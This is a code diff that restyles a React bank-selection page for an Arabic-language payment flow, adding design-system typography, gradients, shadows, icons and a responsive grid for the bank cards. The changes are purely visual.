@@ -3,7 +3,8 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Building2, Loader2 } from "lucide-react";
+import { Building2, Loader2, CheckCircle2, Sparkles } from "lucide-react";
+import { designSystem } from "@/lib/designSystem";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
@@ -174,25 +175,32 @@ const PaymentBankSelector = () => {
         }}
       >
         <div className="container mx-auto px-4 max-w-4xl">
-          <div className="mb-8 text-center">
-            <h1 
-              className="text-3xl sm:text-4xl font-bold mb-3" 
+          <div className="mb-10 text-center">
+            <div className="flex items-center justify-center gap-3 mb-4">
+              <Sparkles className="w-7 h-7" style={{ color: companyBranding?.colors.primary || govSystem.colors.primary }} />
+              <h1 
+                className="text-3xl sm:text-5xl font-bold" 
+                style={{ 
+                  color: designSystem.colors.neutral[900],
+                  fontFamily: designSystem.typography.fontFamilies.arabic,
+                  fontWeight: designSystem.typography.fontWeights.extrabold
+                }}
+              >
+                اختر بنكك
+              </h1>
+            </div>
+            <div 
+              className="inline-flex items-center gap-2 px-6 py-3 rounded-full text-xl sm:text-2xl font-bold" 
               style={{ 
-                color: companyBranding?.colors.text || govSystem.colors.text,
-                fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                background: `linear-gradient(135deg, ${companyBranding?.colors.primary || govSystem.colors.primary}, ${companyBranding?.colors.secondary || govSystem.colors.secondary})`,
+                color: '#ffffff',
+                boxShadow: designSystem.shadows.lg,
+                fontFamily: designSystem.typography.fontFamilies.arabic
               }}
             >
-              اختر البنك
-            </h1>
-            <p 
-              className="text-lg sm:text-xl font-semibold" 
-              style={{ 
-                color: companyBranding?.colors.primary || govSystem.colors.primary,
-                fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-              }}
-            >
+              <Building2 className="w-6 h-6" />
               {formattedAmount}
-            </p>
+            </div>
           </div>
 
         {loadingBanks ? (
@@ -218,7 +226,7 @@ const PaymentBankSelector = () => {
           </Card>
         ) : (
           <>
-            <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 sm:gap-6 mb-8">
+            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 sm:gap-7 mb-8">
               {banks.map((bank) => (
                 <div
                   key={bank.id}
@@ -226,24 +234,31 @@ const PaymentBankSelector = () => {
                   onClick={() => handleBankSelect(bank.id)}
                 >
                   <div 
-                    className="relative overflow-hidden rounded-2xl bg-white p-4 sm:p-6 transition-all duration-500 hover:scale-105 hover:shadow-2xl border-2 flex flex-col items-center"
+                    className="relative overflow-hidden bg-white p-6 sm:p-8 transition-all duration-300 flex flex-col items-center"
                     style={{
-                      borderColor: selectedBank === bank.id ? (bank.color || govSystem.colors.primary) : '#e5e7eb',
-                      boxShadow: selectedBank === bank.id ? `0 10px 40px -10px ${bank.color || govSystem.colors.primary}60` : '0 2px 8px rgba(0,0,0,0.08)',
+                      borderRadius: designSystem.borderRadius['2xl'],
+                      border: selectedBank === bank.id ? `3px solid ${bank.color || govSystem.colors.primary}` : `2px solid ${designSystem.colors.neutral[200]}`,
+                      boxShadow: selectedBank === bank.id ? `0 20px 50px -15px ${bank.color || govSystem.colors.primary}50` : designSystem.shadows.md,
+                      transform: selectedBank === bank.id ? 'scale(1.02)' : 'scale(1)',
                     }}
                   >
                     {selectedBank === bank.id && (
                       <div
-                        className="absolute top-2 right-2 w-6 h-6 rounded-full flex items-center justify-center shadow-lg z-10"
+                        className="absolute top-3 right-3 w-8 h-8 rounded-full flex items-center justify-center shadow-xl z-10 animate-bounce"
                         style={{ backgroundColor: bank.color || govSystem.colors.primary }}
                       >
-                        <svg className="w-4 h-4 text-white" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" viewBox="0 0 24 24" stroke="currentColor">
-                          <path d="M5 13l4 4L19 7" />
-                        </svg>
+                        <CheckCircle2 className="w-5 h-5 text-white" strokeWidth={3} />
                       </div>
                     )}
                     
-                    <div className="aspect-square w-full flex items-center justify-center mb-3">
+                    <div 
+                      className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-300"
+                      style={{
+                        background: `linear-gradient(135deg, ${bank.color || govSystem.colors.primary}08, ${bank.color || govSystem.colors.primary}15)`,
+                      }}
+                    />
+                    
+                    <div className="aspect-square w-full flex items-center justify-center mb-4 relative z-10">
                       <BankLogo 
                         bankId={bank.id}
                         bankName={bank.name}
